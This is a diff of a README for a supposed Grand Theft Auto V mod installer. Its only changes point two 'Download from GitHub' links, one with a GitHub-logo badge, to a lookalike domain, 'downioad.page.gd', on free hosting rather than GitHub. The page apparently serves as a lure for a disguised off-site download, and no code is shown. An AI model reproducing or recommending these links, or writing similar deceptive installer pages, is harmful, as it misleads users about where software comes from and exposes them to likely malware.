@@ -2,7 +2,7 @@
 
 Welcome to the OpenIV Latest Mods Installer, your essential companion for customizing Grand Theft Auto V on Windows. This tool simplifies the process of adding and managing vehicle, clothing, and map modifications, ensuring your game remains up-to-date and uniquely yours with the latest community content.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -45,7 +45,7 @@ A: Absolutely. A core feature of this tool is its backup system. Every time you 
 
 Get the latest version to start your modding journey:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
